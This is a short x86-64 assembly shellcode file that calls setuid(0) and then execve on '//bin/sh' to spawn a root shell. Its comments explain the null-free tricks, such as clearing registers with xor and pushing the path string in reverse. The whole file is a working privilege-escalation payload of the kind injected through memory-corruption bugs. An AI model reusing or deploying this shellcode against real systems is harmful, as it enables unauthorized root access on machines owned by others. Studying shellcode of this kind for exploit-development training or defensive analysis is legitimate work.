BITS 64
global _start

_start:

xor rax, rax
push rax						; push the cleared register
pop rdi							; pop the zer0z into 1st argument

add	   al,0x69					; setuid 105 or 0x69h
syscall							; call setuid(0)


xor rax, rax

push	rax 					; null terminator for the string
mov 	rbx, 0x68732f6e69622f2f ; //bin/sh backwards
push 	rbx 					;
mov 	rdi, rsp				; move address from stack pointer to first argument

push	rax
push	rdi						; actually we would not need this one
mov		rsi, rsp				; move the address to the 2nd argument

mov		rdx, rax				; no envp necessary

mov		al,0x3B					; execve into rax

syscall
